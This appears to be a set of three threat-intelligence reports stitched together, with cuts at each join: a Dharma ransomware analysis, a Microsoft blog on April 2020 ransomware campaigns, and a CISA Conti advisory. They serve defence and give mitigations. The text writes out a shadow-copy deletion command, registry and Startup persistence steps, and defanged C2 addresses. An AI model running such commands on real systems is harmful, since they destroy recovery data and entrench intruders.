tool\n\nns.exe is a network enumeration and scanning tool used by attackers to scan SMB shares,\nopen ports, and services through which they can move within the network.\n\nProcess Hacker is a program used mostly by system administrators for monitoring,\ndebugging, and troubleshooting, but in this case, it was used for malicious purposes such\nas disabling AV or services.\n\nFollowing the pre-execution process, the attacker uploads a ransomware file and executes\nit.\n\nTechnical details\n\nOnce executed, this variant of Dharma ransomware uses the below commands to quietly\ndelete all of the shadow volume copies on the machine.\n\nmode con cp select=1251\n\nvssadmin delete shadows /all /quiet\n\nhttps://www.softperfect.com/products/networkscanner/\nhttps://github.com/processhacker/processhacker\n\n\n3/5\n\nExit\n\nFor persistence, the ransomware executes the following commands:\n\n1. Copy the file to %windir%system32 or %appdata% and set\n'LOCAL_MACHINE/LOCAL_USER Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n\n2. Copy file to 'Startup' folder\n\n3. Copy file to 'Common Startup’ folder\n\nThe ransomware encrypts files with the following extensions:\n\nFigure 2: File extensions to encrypt\n\nThe ransomware encrypts files using an AES 256 algorithm. The AES key is also encrypted\nwith an RSA 1024 algorithm. This encrypted AES key is stored at the end of the encrypted\nfile along with the filename.\n\nThe name of the encrypted files have the following pattern:\n\n[Filename].id-{8 bytes ID}.[recovery_email].zimba\n\nFigure 3: Encrypted files\n\nAfter encrypting the files, the ransomware pops up two different ransom notes on the\nvictim’s computer. One is the Info.hta file, which is launched via autorun when a user logs\ninto the computer.\n\n\n\n4/5\n\nFigure 4: info.hta\n\nThe other note is called FILES ENCRYPTED.txt and can be found on the desktop.\n\nFigure 5: FILES ENCRYPTED.txt\n\nLateral movement\n\nDharma ransomware uses typical methods for obtaining credentials and propagating\nlaterally within a network. In most cases, it uses the Mimikatz tool, which allows it to dump\nthe network share credentials, and in other cases, it uses NirSoft CredentialsFileView,\nwhich allows for the recovery of passwords stored in encrypted credential files. The\nobtained credentials are used to attempt lateral movement inside the on-prem as well as\npublic cloud infrastructure.\n\nIn some cases, the ransomware tries to spread through the network by taking advantage of\nthe compromised Domain Controller and deploying a Default Domain Policy that will run the\nransomware payload on StartUp for each machine.\n\n  \n\nConclusion\n\n\n\n5/5\n\nSince Dharma ransomware is usually installed by gaining access to Remote Desktop\nServices, it is important to ensure that those services are properly locked. This includes\nensuring that computers running Remote Desktop Services do not connect directly to the\ninternet. Instead, organizations should use a zero trust architecture to allow remote users to\nsecurely access these servers without exposing them to the entire internet. \n\nWhile applying security patches is always important, most RDP-based attacks rely on\ncracking weak credentials, so passwords should be long, unique, and random. It’s important\nfor enterprises to establish password requirements and train employees to use strong\npasswords. \n\nAttackers typically identify potential targets by scanning the internet for systems listening on\nthe default RDP port (TCP 3389). Changing the listening port via Windows Registry can\nhelp organizations hide vulnerable connections.\n\nMITRE ATT&CK tactic and technique mapping\n\nTactic Technique\n\nT1190 Exploit Public-Facing Application\n\nT1059 Command Line Interface\n\nT1061 Graphical User Interface\n\nT1547 Boot or Logon Autostart Execution\n\nT1037 Startup Items\n\nT1110 Brute Force\n\nT1003 Credential Dumping\n\nT1083 File and Directory Discovery\n\nT1135 Network Share Discovery\n\nT1018 Remote System Discovery\n\nT1063 Security Software Discovery\n\nT1076 Remote Desktop Protocol\n\nT1105 Remote File Copy\n\nT1486 Data Encrypted for Impact\n\nhttps://attack.mitre.org/",

Multiple ransomware groups that have been\naccumulating access and maintaining persistence on target networks for several months\nactivated dozens of ransomware deployments in the first two weeks of April 2020.\n\nAdditional resources\nProtect your organization against ransomware: aka.ms/ransomware\n\nLearn how attackers operate: Human-operated ransomware attacks: A preventable\ndisaster\n\nSo far the attacks have affected aid organizations, medical billing companies, manufacturing,\ntransport, government institutions, and educational software providers, showing that these\nransomware groups give little regard to the critical services they impact, global crisis\nnotwithstanding. These attacks, however, are not limited to critical services, so organizations\nshould be vigilant for signs of compromise.\n\nThe ransomware deployments in this two-week period appear to cause a slight uptick in the\nvolume of ransomware attacks. However, Microsoft security intelligence as well as forensic\ndata from relevant incident response engagements by Microsoft Detection and Response\nTeam (DART) showed that many of the compromises that enabled these attacks occurred\nearlier. Using an attack pattern typical of human-operated ransomware campaigns, attackers\nhave compromised target networks for several months beginning earlier this year and have\nbeen waiting to monetize their attacks by deploying ransomware when they would see the\nmost financial gain.\n\nMany of these attacks started with the exploitation of vulnerable internet-facing network\ndevices; others used brute force to compromise RDP servers. The attacks delivered a wide\nrange of payloads, but they all used the same techniques observed in human-operated\nransomware campaigns: credential theft and lateral movement, culminating in the\ndeployment of a ransomware payload of the attacker’s choice. Because the ransomware\ninfections are at the tail end of protracted attacks, defenders should focus on hunting for\nsigns of adversaries performing credential theft and lateral movement activities to prevent\nthe deployment of ransomware.\n\nhttps://www.microsoft.com/security/blog/2020/04/28/ransomware-groups-continue-to-target-healthcare-critical-services-heres-how-to-reduce-risk/\nhttps://aka.ms/ransomware\nhttps://www.microsoft.com/security/blog/2020/03/05/human-operated-ransomware-attacks-a-preventable-disaster/\nhttps://aka.ms/human-operated-ransomware\n\n\n2/10\n\nIn this blog, we share our in-depth analysis of these ransomware campaigns. Below, we will\ncover:\n\nWe have included additional technical details including hunting guidance and recommended\nprioritization for security operations (SecOps).\n\nVulnerable and unmonitored internet-facing systems provide easy\naccess to human-operated attacks\n\nWhile the recent attacks deployed various ransomware strains, many of the campaigns\nshared infrastructure with previous ransomware campaigns and used the same techniques\ncommonly observed in human-operated ransomware attacks.\n\nIn stark contrast to attacks that deliver ransomware via email—which tend to unfold much\nfaster, with ransomware deployed within an hour of initial entry—the attacks we saw in April\nare similar to the Doppelpaymer ransomware campaigns from 2019, where attackers gained\naccess to affected networks months in advance. They then remained relatively dormant\nwithin environments until they identified an opportune time to deploy ransomware.\n\nTo gain access to target networks, the recent ransomware campaigns exploited internet-\nfacing systems with the following weaknesses:\n\nRemote Desktop Protocol (RDP) or Virtual Desktop endpoints without multi-factor\nauthentication (MFA)\nOlder platforms that have reached end of support and are no longer getting security\nupdates, such as Windows Server 2003 and Windows Server 2008, exacerbated by\nthe use of weak passwords\nMisconfigured web servers, including IIS, electronic health record (EHR) software,\nbackup servers, or systems management servers\nCitrix Application Delivery Controller (ADC) systems affected by CVE-2019-19781\nPulse Secure VPN systems affected by CVE-2019-11510\n\nApplying security patches for internet-facing systems is critical in preventing these attacks.\nIt’s also important to note that, although Microsoft security researchers have not observed\nthe recent attacks exploiting the following vulnerabilities, historical signals indicate that these\ncampaigns may eventually exploit them to gain access, so they are worth reviewing: CVE-\n2019-0604, CVE-2020-0688, CVE-2020-10189.\n\nLike many breaches, attackers employed credential theft, lateral movement capabilities using\ncommon tools, including Mimikatz and Cobalt Strike, network reconnaissance, and data\nexfiltration. In these specific campaigns, the operators gained access to highly privileged\nadministrator credentials and were ready to take potentially more destructive action if\ndisturbed. On networks where attackers deployed ransomware, they deliberately maintained\ntheir presence on some endpoints, intending to reinitiate malicious activity after ransom is\n\nhttps://support.citrix.com/article/CTX267027\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-11510\nhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0604\nhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-10189\n\n\n3/10\n\npaid or systems are rebuilt. In addition, while only a few of these groups gained notoriety for\nselling data, almost all of them were observed viewing and exfiltrating data during these\nattacks, even if they have not advertised or sold yet.\n\nAs with all human-operated ransomware campaigns, these recent attacks spread throughout\nan environment affecting email identities, endpoints, inboxes, applications, and more.\nBecause it can be challenging even for experts to ensure complete removal of attackers from\na fully compromised network, it’s critical that vulnerable internet-facing systems are\nproactively patched and mitigations put in place to reduce the risk from these kinds of\nattacks.\n\nA motley crew of ransomware payloads\n\nWhile individual campaigns and ransomware families exhibited distinct attributes as\ndescribed in the sections below, these human-operated ransomware campaigns tended to\nbe variations on a common attack pattern. They unfolded in similar ways and employed\ngenerally the same attack techniques. Ultimately, the specific ransomware payload at the\nend of each attack chain was almost solely a stylistic choice made by the attackers.\n\nRobbinHood ransomware\n\nRobbinHood ransomware operators gained some attention for exploiting vulnerable drivers\nlate in their attack chain to turn off security software. However, like many other human-\noperated ransomware campaigns, they typically start with an RDP brute-force attack against\nan exposed asset. They eventually obtain privileged credentials, mostly local administrator\naccounts with shared or common passwords, and service accounts with domain admin\n\nhttps://www.microsoft.com/security/blog/2020/03/17/secured-core-pcs-a-brief-showcase-of-chip-to-cloud-security-against-kernel-attacks/\n\n\n4/10\n\nprivileges. RobbinHood operators, like Ryuk and other well-publicized ransomware groups,\nleave behind new local and Active Directory user accounts, so they can regain access after\ntheir malware and tools have been removed.\n\nVatet loader\n\nAttackers often shift infrastructure, techniques, and tools to avoid notoriety that might attract\nlaw enforcement or security researchers. They often retain them while waiting for security\norganizations to start considering associated artifacts inactive, so they face less scrutiny.\nVatet, a custom loader for the Cobalt Strike framework that has been seen in ransomware\ncampaigns as early as November 2018, is one of the tools that has resurfaced in the recent\ncampaigns.\n\nThe group behind this tool appears to be particularly intent on targeting hospitals, as well as\naid organizations, insulin providers, medical device manufacturers, and other critical\nverticals. They are one of the most prolific ransomware operators during this time and have\ncaused dozens of cases.\n\nUsing Vatet and Cobalt Strike, the group has delivered various ransomware payloads. More\nrecently, they have been deploying in-memory ransomware that utilizes Alternate Data\nStreams (ADS) and displays simplistic ransom notes copied from older ransomware families.\nTo access target networks, they exploit CVE-2019-19781, brute force RDP endpoints, and\nsend email containing .lnk files that launch malicious PowerShell commands. Once inside a\nnetwork, they steal credentials, including those stored in the Credential Manager vault, and\nmove laterally until they gain domain admin privileges. The group has been observed\nexfiltrating data prior to deploying ransomware.\n\nNetWalker ransomware\n\nNetWalker campaign operators gained notoriety for targeting hospitals and healthcare\nproviders with emails claiming to provide information about COVID-19. These emails also\ndelivered NetWalker ransomware directly as a .vbs attachment, a technique that has gained\nmedia attention. However, the campaign operators also compromised networks using\nmisconfigured IIS-based applications to launch Mimikatz and steal credentials, which they\nthen used to launch PsExec, and eventually deploying the same NetWalker ransomware.\n\nPonyFinal ransomware\n\nThis Java-based ransomware had been considered a novelty, but the campaigns deploying\nPonyFinal weren’t unusual. Campaign operators compromised internet-facing web systems\nand obtained privileged credentials. To establish persistence, they used PowerShell\ncommands to launch the system tool mshta.exe and set up a reverse shell based on a\ncommon PowerShell attack framework. They also used legitimate tools, such as Splashtop,\nto maintain remote desktop connections.\n\nhttps://support.citrix.com/article/CTX267027\n\n\n5/10\n\nMaze ransomware\n\nOne of the first ransomware campaigns to make headlines for selling stolen data, Maze\ncontinues to target technology providers and public services. Maze has a history of going\nafter managed service providers (MSPs) to gain access to the data and networks of MSP\ncustomers.\n\nMaze has been delivered via email, but campaign operators have also deployed Maze to\nnetworks after gaining access using common vectors, such as RDP brute force. Once inside\na network, they perform credential theft, move laterally to access resources and exfiltrate\ndata, and then deploy ransomware.\n\nIn a recent campaign, Microsoft security researchers tracked Maze operators establishing\naccess through an internet-facing system by performing RDP brute force against the local\nadministrator account. Using the brute-forced password, campaign operators were able to\nmove laterally because built-in administrator accounts on other endpoints used the same\npasswords.\n\nAfter gaining control over a domain admin account through credential theft, campaign\noperators used Cobalt Strike, PsExec, and a plethora of other tools to deploy various\npayloads and access data. They established fileless persistence using scheduled tasks and\nservices that launched PowerShell-based remote shells. They also turned on Windows\nRemote Management for persistent control using stolen domain admin privileges. To weaken\nsecurity controls in preparation for ransomware deployment, they manipulated various\nsettings through Group Policy.\n\nREvil ransomware\n\nPossibly the first ransomware group to take advantage of the network device vulnerabilities\nin Pulse VPN to steal credentials to access networks, REvil (also called Sodinokibi) gained\nnotoriety for accessing MSPs and accessing the networks and documents of customers –\nand selling access to both. They kept up this activity during the COVID-19 crisis, targeting\nMSPs and other targets like local governments. REvil attacks are differentiated in their\nuptake of new vulnerabilities, but their techniques overlap with many other groups, relying on\ncredential theft tools like Mimikatz once in the network and performing lateral movement and\nreconnaissance with tools like PsExec.\n\nOther ransomware families\n\nOther ransomware families used in human-operated campaigns during this period include:\n\nParadise, which used to be distributed directly via email but is now used in human-\noperated ransomware attacks\nRagnarLocker, which is deployed by a group that heavily uses RDP and Cobalt Strike\nwith stolen credentials\n\n\n\n6/10\n\nMedusaLocker, which is possibly deployed via existing Trickbot infections\nLockBit, which is distributed by operators that use the publicly available penetration\ntesting tool CrackMapExec to move laterally\n\nImmediate response actions for active attacks\n\nWe highly recommend that organizations immediately check if they have any alerts related to\nthese ransomware attacks and prioritize investigation and remediation. Malicious behaviors\nrelevant to these attacks that defenders should pay attention to include:\n\nMalicious PowerShell, Cobalt Strike, and other penetration-testing tools that can allow\nattacks to blend in as benign red team activities\nCredential theft activities, such as suspicious access to Local Security Authority\nSubsystem Service (LSASS) or suspicious registry modifications, which can indicate\nnew attacker payloads and tools for stealing credentials\nAny tampering with a security event log, forensic artifact such as the USNJournal, or a\nsecurity agent, which attackers do to evade detections and to erase chances of\nrecovering data\n\nCustomers using Microsoft Defender Advanced Threat Protection (ATP) can consult a\ncompanion threat analytics report for more details on relevant alerts, as well as advanced\nhunting queries. Customers subscribed to the Microsoft Threat Experts service can also refer\nto the targeted attack notification, which has detailed timelines of attacks, recommended\nmitigation steps for disrupting attacks, and remediation advice.\n\nIf your network is affected, perform the following scoping and investigation activities\nimmediately to understand the impact of this breach. Using indicators of compromise (IOCs)\nalone to determine impact from these threats is not a durable solution, as most of these\nransomware campaigns employ “one-time use” infrastructure for campaigns, and often\nchange their tools and systems once they determine the detection capabilities of their\ntargets. Detections and mitigations should concentrate on holistic behavioral based hunting\nwhere possible, and hardening infrastructure weaknesses favored by these attackers as\nsoon as possible.\n\nInvestigate affected endpoints and credentials\n\nInvestigate endpoints affected by these attacks and identify all the credentials present on\nthose endpoints. Assume that these credentials were available to attackers and that all\nassociated accounts are compromised. Note that attackers can not only dump credentials for\naccounts that have logged on to interactive or RDP sessions, but can also dump cached\ncredentials and passwords for service accounts and scheduled tasks that are stored in the\nLSA Secrets section of the registry.\n\nhttps://www.microsoft.com/en-us/microsoft-365/windows/microsoft-defender-atp\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/threat-analytics\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/microsoft-threat-experts\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/microsoft-threat-experts#targeted-attack-notification\n\n\n7/10\n\nFor endpoints onboarded to Microsoft Defender ATP, use advanced hunting to identify\naccounts that have logged on to affected endpoints. The threat analytics report\ncontains a hunting query for this purpose.\nOtherwise, check the Windows Event Log for post-compromise logons—those that\noccur after or during the earliest suspected breach activity—with event ID 4624 and\nlogon type 2 or 10. For any other timeframe, check for logon type 4 or 5.\n\nIsolate compromised endpoints\n\nIsolate endpoints that have command-and-control beacons or have been lateral movement\ntargets. Locate these endpoints using advanced hunting queries or other methods of directly\nsearching for related IOCs. Isolate machines using Microsoft Defender ATP, or use other\ndata sources, such as NetFlow, and search through your SIEM or other centralized event\nmanagement solutions. Look for lateral movement from known affected endpoints.\n\nAddress internet-facing weaknesses\n\nIdentify perimeter systems that attackers might have utilized to access your network. You can\nuse a public scanning interface, such as shodan.io, to augment your own data. Systems that\nshould be considered of interest to attackers include:\n\nRDP or Virtual Desktop endpoints without MFA\nCitrix ADC systems affected by CVE-2019-19781\nPulse Secure VPN systems affected by CVE-2019-11510\nMicrosoft SharePoint servers affected by CVE-2019-0604\nMicrosoft Exchange servers affected by CVE-2020-0688\nZoho ManageEngine systems affected by CVE-2020-10189\n\nTo further reduce organizational exposure, Microsoft Defender ATP customers can use the\nThreat and Vulnerability Management (TVM) capability to discover, prioritize, and remediate\nvulnerabilities and misconfigurations. TVM allows security administrators and IT\nadministrators to collaborate seamlessly to remediate issues.\n\nInspect and rebuild devices with related malware infections\n\nMany ransomware operators enter target networks through existing infections of malware\nlike Emotet and Trickbot. These malware families, traditionally considered to be banking\ntrojans, have been used to deliver all kinds of payloads, including persistent implants.\nInvestigate and remediate any known infections and consider them possible vectors for\nsophisticated human adversaries. Ensure that you check for exposed credentials, additional\npayloads, and lateral movement prior to rebuilding affected endpoints or resetting\npasswords.\n\nhttps://www.microsoft.com/en-us/microsoft-365/windows/microsoft-defender-atp\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/respond-machine-alerts#isolate-machines-from-the-network\nhttps://www.shodan.io/\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/next-gen-threat-and-vuln-mgt\n\n\n8/10\n\nBuilding security hygiene to defend networks against human-\noperated ransomware\n\nAs ransomware operators continue to compromise new targets, defenders should proactively\nassess risk using all available tools. You should continue to enforce proven preventive\nsolutions—credential hygiene, minimal privileges, and host firewalls—to stymie these\nattacks, which have been consistently observed taking advantage of security hygiene issues\nand over-privileged credentials.\n\nApply these measures to make your network more resilient against new breaches,\nreactivation of dormant implants, or lateral movement:\n\nRandomize local administrator passwords using a tool such as LAPS.\nApply Account Lockout Policy.\nEnsure good perimeter security by patching exposed systems. Apply mitigating factors,\nsuch as MFA or vendor-supplied mitigation guidance, for vulnerabilities.\nUtilize host firewalls to limit lateral movement. Preventing endpoints from\ncommunicating on TCP port 445 for SMB will have limited negative impact on most\nnetworks, but can significantly disrupt adversary activities.\nTurn on cloud-delivered protection for Microsoft Defender Antivirus or the equivalent for\nyour antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-\nbased machine learning protections block a huge majority of new and unknown\nvariants.\nFollow standard guidance in the security baselines for Office and Office 365 and the\nWindows security baselines. Use Microsoft Secure Score assesses to measures\nsecurity posture and get recommended improvement actions, guidance, and control.\nTurn on tamper protection features to prevent attackers from stopping security\nservices.\nTurn on attack surface reduction rules, including rules that can block ransomware\nactivity:\n\nUse advanced protection against ransomware\nBlock process creations originating from PsExec and WMI commands\nBlock credential stealing from the Windows local security authority subsystem\n(lsass.exe)\n\nFor additional guidance on improving defenses against human-operated ransomware and\nbuilding better security posture against cyberattacks in general, read Human-operated\nransomware attacks: A preventable disaster.\n\nMicrosoft Threat Protection: Coordinated defense against complex\nand wide-reaching human-operated ransomware\n\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/account-lockout-policy\nhttps://support.microsoft.com/en-us/help/3185535/preventing-smb-traffic-from-lateral-connections\nhttps://techcommunity.microsoft.com/t5/microsoft-security-baselines/bg-p/Microsoft-Security-Baselines\nhttps://docs.microsoft.com/en-us/microsoft-365/security/defender/microsoft-secure-score?view=o365-worldwide\nhttps://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction\nhttps://www.microsoft.com/security/blog/2020/03/05/human-operated-ransomware-attacks-a-preventable-disaster/\n\n\n9/10\n\nWhat we’ve learned from the increase in ransomware deployments in April is that attackers\npay no attention to the real-world consequences of disruption in services—in this time of\nglobal crisis—that their attacks cause.\n\nHuman-operated ransomware attacks represent a different level of threat because\nadversaries are adept at systems administration and security misconfigurations and can\ntherefore adapt to any path of least resistance they find in a compromised network. If they\nrun into a wall, they try to break through. And if they can’t break through a wall, they’ve\nshown that they can skillfully find other ways to move forward with their attack. As a result,\nhuman-operated ransomware attacks are complex and wide-reaching. No two attacks are\nexactly the same.\n\nMicrosoft Threat Protections (MTP) provides coordinated defenses that uncover the\ncomplete attack chain and help block sophisticated attacks like human-operated\nransomware. MTP combines the capabilities of multiple Microsoft 365 security services to\norchestrate protection, prevention, detection, and response across endpoints, email,\nidentities, and apps.\n\nThrough built-in intelligence, automation, and integration, MTP can block attacks, eliminate\ntheir persistence, and auto-heal affected assets. It correlates signals and consolidates alerts\nto help defenders prioritize incidents for investigation and response. MTP also provides a\nunique cross-domain hunting capability that can further help defenders identify attack sprawl\nand get org-specific insights for hardening defenses.\n\nMicrosoft Threat Protection is also part of a chip-to-cloud security approach that combines\nthreat defense on the silicon, operating system, and cloud. Hardware-backed security\nfeatures on Windows 10 like address space layout randomization (ASLR), Control Flow\nGuard (CFG), and others harden the platform against many advanced threats, including\nones that take advantage of vulnerable kernel drivers. These platform security features\nseamlessly integrate with Microsoft Defender ATP, providing end-to-end security that starts\nfrom a strong hardware root of trust. On Secured-core PCs these mitigations are enabled by\ndefault.\n\nWe continue to work with our customers, partners, and the research community to track\nhuman-operated ransomware and other sophisticated attacks. For dire cases customers can\nuse available services like the Microsoft Detection and Response (DART) team to help\ninvestigate and remediate.\n\nMicrosoft Threat Protection Intelligence Team\n\nAppendix: MITRE ATT&CK techniques observed\n\nhttps://www.microsoft.com/en-us/security/technology/threat-protection\nhttps://www.microsoft.com/security/blog/2020/03/17/secured-core-pcs-a-brief-showcase-of-chip-to-cloud-security-against-kernel-attacks/\nhttps://www.microsoft.com/en-us/windowsforbusiness/windows10-secured-core-computers\nhttps://www.microsoft.com/security/blog/microsoft-detection-and-response-team-dart-blog-series/\n\n\n10/10\n\nHuman-operated ransomware campaigns employ a broad range of techniques made\npossible by attacker control over privileged domain accounts.

Notable attack vectors include\nTrickbot and Cobalt Strike (see below for details). \n\nWhile there are no specific or credible cyber threats to the U.S. homeland at this time, CISA,\nFBI, and NSA encourage organizations to review this advisory and apply the recommended\nmitigations. \n\n(end of update)\n\nThe Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of\nInvestigation (FBI) have observed the increased use of Conti ransomware in more than 400\nattacks on U.S. and international organizations. (See FBI Flash: Conti Ransomware Attacks\nImpact Healthcare and First Responder Networks.) In typical Conti ransomware attacks,\nmalicious cyber actors steal files, encrypt servers and workstations, and demand a ransom\npayment. \n\nTo secure systems against Conti ransomware, CISA, FBI, and the National Security Agency\n(NSA) recommend implementing the mitigation measures described in this Advisory, which\ninclude requiring multifactor authentication (MFA), implementing network segmentation, and\nkeeping operating systems and software up to date.\n\nClick here for a PDF version of this report.\n\nClick here for indicators of compromise (IOCs) in STIX format.\n\nNote: This Alert uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge\n(ATT&CK®) framework, version 9. See the ATT&CK for Enterprise for all referenced threat\nactor tactics and techniques.\n\nhttps://us-cert.cisa.gov/ncas/alerts/aa21-265a\nhttps://us-cert.cisa.gov/ncas/tips/ST05-012\nhttps://www.ic3.gov/Media/News/2021/210521.pdf\nhttps://us-cert.cisa.gov/sites/default/files/publications/AA21-265A-Conti_Ransomware_TLP_WHITE.pdf\nhttps://us-cert.cisa.gov/sites/default/files/publications/AA21-265A.stix.xml\nhttps://attack.mitre.org/versions/v9/techniques/enterprise/\n\n\n2/11\n\nTechnical Details\n\nWhile Conti is considered a ransomware-as-a-service (RaaS) model ransomware variant,\nthere is variation in its structure that differentiates it from a typical affiliate model. It is likely\nthat Conti developers pay the deployers of the ransomware a wage rather than a percentage\nof the proceeds used by affiliate cyber actors and receives a share of the proceeds from a\nsuccessful attack. \n\nConti actors often gain initial access [TA0001] to networks through:\n\nSpearphishing campaigns using tailored emails that contain malicious attachments\n[T1566.001] or malicious links [T1566.002];\n\nMalicious Word attachments often contain embedded scripts that can be used to\ndownload or drop other malware—such as TrickBot and IcedID, and/or Cobalt\nStrike—to assist with lateral movement and later stages of the attack life cycle\nwith the eventual goal of deploying Conti ransomware. [1],[2],[3]\n\nStolen or weak Remote Desktop Protocol (RDP) credentials [T1078].[4]\nPhone calls;\nFake software promoted via search engine optimization;\nOther malware distribution networks (e.g., ZLoader); and\nCommon vulnerabilities in external assets.\n\nIn the execution phase [TA0002], actors run a getuid  payload before using a more\naggressive payload to reduce the risk of triggering antivirus engines. CISA and FBI have\nobserved Conti actors using Router Scan, a penetration testing tool, to maliciously scan for\nand brute force [T1110] routers, cameras, and network-attached storage devices with web\ninterfaces. Additionally, actors use Kerberos attacks [T1558.003] to attempt to get the Admin\nhash to conduct brute force attacks.\n\nConti actors are known to exploit legitimate remote monitoring and management software\nand remote desktop software as backdoors to maintain persistence [TA0003] on victim\nnetworks.[5] The actors use tools already available on the victim network—and, as needed,\nadd additional tools, such as Windows Sysinternals and Mimikatz—to obtain users’ hashes\nand clear-text credentials, which enable the actors to escalate privileges [TA0004] within a\ndomain and perform other post-exploitation and lateral movement tasks [TA0008]. In some\ncases, the actors also use TrickBot malware to carry out post-exploitation tasks.\n\nAccording to a recently leaked threat actor “playbook,” [6] Conti actors also exploit\nvulnerabilities in unpatched assets, such as the following, to escalate privileges [TA0004]\nand move laterally [TA0008] across a victim’s network:\n\n2017 Microsoft Windows Server Message Block 1.0 server vulnerabilities; [7]\n\"PrintNightmare\" vulnerability (CVE-2021-34527) in Windows Print spooler [8]\nservice; and\n\nhttps://attack.mitre.org/versions/v9/tactics/TA0001/\nhttps://attack.mitre.org/versions/v9/techniques/T1566/001/\nhttps://attack.mitre.org/versions/v9/techniques/T1566/002/\nhttps://attack.mitre.org/software/S0575/\nhttps://attack.mitre.org/software/S0266/\nhttps://attack.mitre.org/software/S0483/\nhttps://attack.mitre.org/versions/v9/techniques/T1078/\nhttps://www.cisa.gov/sites/default/files/Conti%20Ransomware%20Heathcare%20networks.pdf\nhttps://attack.mitre.org/versions/v9/tactics/TA0002/\nhttps://attack.mitre.org/versions/v9/techniques/T1110/\nhttps://attack.mitre.org/versions/v9/techniques/T1558/003/\nhttps://attack.mitre.org/versions/v9/tactics/TA0003/\nhttps://ransomwaredaily.com/conti-ransomware-gang-playbook-mentions-msp-software-channele2e/\nhttps://attack.mitre.org/versions/v9/tactics/TA0004/\nhttps://attack.mitre.org/versions/v9/tactics/TA0008/\nhttps://blog.talosintelligence.com/2021/09/Conti-leak-translation.html\nhttps://attack.mitre.org/versions/v9/tactics/TA0004/\nhttps://attack.mitre.org/versions/v9/tactics/TA0008/\nhttps://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527\n\n\n3/11\n\n\"Zerologon\" vulnerability (CVE-2020-1472) in Microsoft Active Directory Domain\nController systems.[9]\n\nArtifacts leaked with the playbook identify four Cobalt Strike server Internet Protocol (IP)\naddresses Conti actors previously used to communicate with their command and control\n(C2) server.\n\n162.244.80[.]235\n\n85.93.88[.]165\n\n185.141.63[.]120\n\n82.118.21[.]1\n\nCISA and FBI have observed Conti actors using different Cobalt Strike server IP addresses\nunique to different victims.\n\nConti actors often use the open-source Rclone command line program for data exfiltration\n[TA0010]. After the actors steal and encrypt the victim's sensitive data [T1486], they employ\na double extortion technique in which they demand the victim pay a ransom for the release of\nthe encrypted data and threaten the victim with public release of the data if the ransom is not\npaid.\n\nIndicators of Compromise\n\nUpdated March 9, 2022:\n The following domains have registration and naming characteristics similar to domains used\n\nby groups that have distributed Conti ransomware.

Filter emails containing executable files to prevent\nthem from reaching end users.\nImplement a URL blocklist and/or allowlist to prevent users from accessing malicious\nwebsites.\n\nScan for vulnerabilities and keep software updated. \n\nSet antivirus/antimalware programs to conduct regular scans of network assets using\nup-to-date signatures. \nUpgrade software and operating systems, applications, and firmware on network\nassets in a timely manner. Consider using a centralized patch management system. \n\nRemove unnecessary applications and apply controls.\n\nRemove any application not deemed necessary for day-to-day operations. Conti threat\nactors leverage legitimate applications—such as remote monitoring and management\nsoftware and remote desktop software applications—to aid in the malicious exploitation\nof an organization’s enterprise. \nInvestigate any unauthorized software, particularly remote desktop or remote\nmonitoring and management software.\nImplement application allowlisting, which only allows systems to execute programs\nknown and permitted by the organization's security policy. Implement software\nrestriction policies (SRPs) or other controls to prevent programs from executing from\ncommon ransomware locations, such as temporary folders supporting popular internet\nbrowsers or compression/decompression programs.\nImplement execution prevention by disabling macro scripts from Microsoft Office files\ntransmitted via email. Consider using Office Viewer software to open Microsoft Office\nfiles transmitted via email instead of full Microsoft Office suite applications.\nSee the joint Alert, Publicly Available Tools Seen in Cyber Incidents Worldwide—\ndeveloped by CISA and the cybersecurity authorities of Australia, Canada, New\nZealand, and the United Kingdom—for guidance on detection and protection against\nmalicious use of publicly available tools.\n\nImplement endpoint and detection response tools. \n\nEndpoint and detection response tools allow a high degree of visibility into the security\nstatus of endpoints and can help effectively protect against malicious cyber actors. \n\nLimit access to resources over the network, especially by restricting RDP. \n\nAfter assessing risks, if RDP is deemed operationally necessary, restrict the originating\nsources and require multifactor authentication.\n\nhttps://us-cert.cisa.gov/ncas/alerts/AA18-284A\n\n\n9/11\n\nSecure user accounts.\n\nRegularly audit administrative user accounts and configure access controls under the\nprinciples of least privilege and separation of duties.\nRegularly audit logs to ensure new accounts are legitimate users.\n\nReview CISA’s APTs Targeting IT Service Provider Customers guidance for additional\nmitigations specific to IT Service Providers and their customers.\n\nUse the Ransomware Response Checklist in case of infection.\n\nIf a ransomware incident occurs at your organization, CISA, FBI, and NSA recommend the\nfollowing actions:\n\nFollow the Ransomware Response Checklist on p. 11 of the CISA-Multi-State\nInformation Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.\nScan your backups. If possible, scan your backup data with an antivirus program to\ncheck that it is free of malware.\nReport incidents immediately to CISA at https://us-cert.cisa.gov/report, a local FBI\nField Office, or U.S. Secret Service Field Office. \nApply incident response best practices found in the joint Advisory, Technical\nApproaches to Uncovering and Remediating Malicious Activity, developed by CISA and\nthe cybersecurity authorities of Australia, Canada, New Zealand, and the United\nKingdom.\n\nCISA, FBI, and NSA strongly discourage paying a ransom to criminal actors. Paying a\nransom may embolden adversaries to target additional organizations, encourage other\ncriminal actors to engage in the distribution of ransomware, and/or may fund illicit activities.\nPaying the ransom also does not guarantee that a victim’s files will be recovered.\n\nAdditional Resources\n\nThe Digital Forensics, Incident Response (DFIR) Report: BazarLoader to Conti\nRansomware in 32 Hours (September 